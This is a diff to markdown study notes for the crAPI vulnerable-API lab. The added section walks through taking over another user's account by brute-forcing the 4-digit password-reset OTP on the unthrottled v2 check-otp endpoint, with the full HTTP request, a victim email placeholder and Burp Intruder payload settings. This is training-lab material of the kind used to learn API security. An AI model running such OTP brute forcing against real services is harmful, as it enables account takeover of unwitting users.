@@ -345,16 +345,36 @@ Set the payloads
 
 * Experiment with password reset
 
-* Experiment with creating another account
+* Discover that the pw reset times is limmited on the v3 api, but not v2
+  ```http
+  POST /identity/api/auth/v3/check-otp
+  Host: crapi.apisec.ai
+  ```
+<br>
+  
+So do a pw reset OTP brute force to take over someone elses acct.
+Send the req to Intruder, payload positions
+```http
+POST /identity/api/auth/v2/check-otp HTTP/1.1
+Host: crapi.apisec.ai
+...
+{"email":"victimsemail@test.com","otp":"§0000§","password":"Passw0rd!"}
 
+```
 
-* Experiment with JWT forging, brute forcing, none, the algo switch, JWT crack attack, etc..
+Then set the position as sniper, and the Payload sets as:
+- Number
+- From: 0000
+- to: 9999
+- step: 1
 
-* Brute forcing might be the answer. If you face any protection mechanisms, remember to leverage the predictable nature of REST APIs to find more similar API endpoints.
+  Number format: decimal
+  min integer: 4
+  max int:     4
 
-This one will depend on your password list..if it's any good or not.
-But you will need to use Burp Intruder 
-send a login request to Intruder
+Then attack
+
+<br>
 
 
 ## Excessive Data Exposure
